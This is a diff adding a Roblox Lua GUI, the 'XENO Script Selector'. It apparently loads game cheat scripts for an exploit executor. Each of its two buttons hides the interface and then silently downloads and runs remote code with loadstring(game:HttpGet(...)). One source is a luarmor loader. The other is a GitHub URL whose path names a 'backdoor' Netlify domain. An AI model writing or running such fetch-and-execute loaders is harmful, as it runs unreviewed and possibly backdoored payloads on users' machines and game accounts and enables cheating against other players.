@@ -1,0 +1,230 @@
+-- ============================================
+-- XENO Script Selector - GUI (Mobile + PC)
+-- UI hilang saat execute, script tetap jalan
+-- ============================================
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ============================================
+-- CREATE GUI
+-- ============================================
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "XenoScriptSelector"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- ============================================
+-- MAIN FRAME (RESPONSIVE)
+-- ============================================
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0.9, 0, 0.7, 0)
+mainFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local sizeConstraint = Instance.new("UISizeConstraint")
+sizeConstraint.MaxSize = Vector2.new(500, 500)
+sizeConstraint.Parent = mainFrame
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = mainFrame
+
+-- ============================================
+-- PADDING
+-- ============================================
+local padding = Instance.new("UIPadding")
+padding.PaddingLeft = UDim.new(0, 15)
+padding.PaddingRight = UDim.new(0, 15)
+padding.PaddingTop = UDim.new(0, 15)
+padding.PaddingBottom = UDim.new(0, 15)
+padding.Parent = mainFrame
+
+-- ============================================
+-- VERTICAL LAYOUT
+-- ============================================
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 10)
+layout.FillDirection = Enum.FillDirection.Vertical
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = mainFrame
+
+-- ============================================
+-- TITLE
+-- ============================================
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Name = "Title"
+titleLabel.Size = UDim2.new(1, 0, 0, 50)
+titleLabel.BackgroundColor3 = Color3.fromRGB(102, 126, 234)
+titleLabel.BorderSizePixel = 0
+titleLabel.Text = "🔐 XENO"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextSize = 20
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Parent = mainFrame
+titleLabel.LayoutOrder = 1
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 8)
+titleCorner.Parent = titleLabel
+
+-- ============================================
+-- SUBTITLE
+-- ============================================
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.Name = "Subtitle"
+subtitleLabel.Size = UDim2.new(1, 0, 0, 25)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Text = "Pilih Script"
+subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+subtitleLabel.TextSize = 13
+subtitleLabel.Font = Enum.Font.Gotham
+subtitleLabel.Parent = mainFrame
+subtitleLabel.LayoutOrder = 2
+
+-- ============================================
+-- XxY BUTTON
+-- ============================================
+local xxyButton = Instance.new("TextButton")
+xxyButton.Name = "XxyButton"
+xxyButton.Size = UDim2.new(1, 0, 0, 55)
+xxyButton.BackgroundColor3 = Color3.fromRGB(255, 107, 107)
+xxyButton.BorderSizePixel = 0
+xxyButton.Text = "🤖 Xxy Script"
+xxyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+xxyButton.TextSize = 16
+xxyButton.Font = Enum.Font.GothamBold
+xxyButton.Parent = mainFrame
+xxyButton.LayoutOrder = 3
+
+local xxyCorner = Instance.new("UICorner")
+xxyCorner.CornerRadius = UDim.new(0, 8)
+xxyCorner.Parent = xxyButton
+
+-- ============================================
+-- NASI BUTTON
+-- ============================================
+local nasiButton = Instance.new("TextButton")
+nasiButton.Name = "NasiButton"
+nasiButton.Size = UDim2.new(1, 0, 0, 55)
+nasiButton.BackgroundColor3 = Color3.fromRGB(78, 205, 196)
+nasiButton.BorderSizePixel = 0
+nasiButton.Text = "🍜 NasiRendang"
+nasiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+nasiButton.TextSize = 16
+nasiButton.Font = Enum.Font.GothamBold
+nasiButton.Parent = mainFrame
+nasiButton.LayoutOrder = 4
+
+local nasiCorner = Instance.new("UICorner")
+nasiCorner.CornerRadius = UDim.new(0, 8)
+nasiCorner.Parent = nasiButton
+
+-- ============================================
+-- STATUS LABEL
+-- ============================================
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Name = "Status"
+statusLabel.Size = UDim2.new(1, 0, 0, 25)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "✅ Ready"
+statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+statusLabel.TextSize = 12
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.Parent = mainFrame
+statusLabel.LayoutOrder = 5
+
+-- ============================================
+-- BUTTON HOVER EFFECTS
+-- ============================================
+local function addHoverEffect(button)
+    local originalColor = button.BackgroundColor3
+    
+    button.MouseEnter:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(
+            math.min(255, math.floor(originalColor.R * 255 + 20)),
+            math.min(255, math.floor(originalColor.G * 255 + 20)),
+            math.min(255, math.floor(originalColor.B * 255 + 20))
+        )
+    end)
+    
+    button.MouseLeave:Connect(function()
+        button.BackgroundColor3 = originalColor
+    end)
+end
+
+addHoverEffect(xxyButton)
+addHoverEffect(nasiButton)
+
+-- ============================================
+-- EXECUTE FUNCTIONS
+-- ============================================
+local function executeXxy()
+    statusLabel.Text = "⏳ Loading Xxy..."
+    statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+    xxyButton.Interactable = false
+    nasiButton.Interactable = false
+    
+    task.wait(0.5)
+    
+    -- Destroy UI sebelum execute
+    screenGui:Destroy()
+    
+    -- Execute script di background
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/ff2f66df8811e8d694770d532d0a0d1f.lua"))()
+        end)
+    end)
+end
+
+local function executeNasi()
+    statusLabel.Text = "⏳ Loading NasiRendang..."
+    statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+    xxyButton.Interactable = false
+    nasiButton.Interactable = false
+    
+    task.wait(0.5)
+    
+    -- Destroy UI sebelum execute
+    screenGui:Destroy()
+    
+    -- Execute script di background
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/akun9vivo-ownerVIPceo/Idk/refs/heads/main/Domian%20https%3Abackdoor-raw-moon.netlify.app'))()
+        end)
+    end)
+end
+
+-- ============================================
+-- BUTTON EVENTS
+-- ============================================
+xxyButton.MouseButton1Click:Connect(function()
+    executeXxy()
+end)
+
+nasiButton.MouseButton1Click:Connect(function()
+    executeNasi()
+end)
+
+-- ============================================
+-- CLOSE GUI (ESC / BACKSPACE)
+-- ============================================
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    
+    if input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.Backspace then
+        screenGui:Destroy()
+    end
+end)
+
+print("✅ XENO GUI Loaded")
+print("🎮 Pilih script untuk execute")
+print("⌨️ Press ESC atau BACKSPACE untuk close")
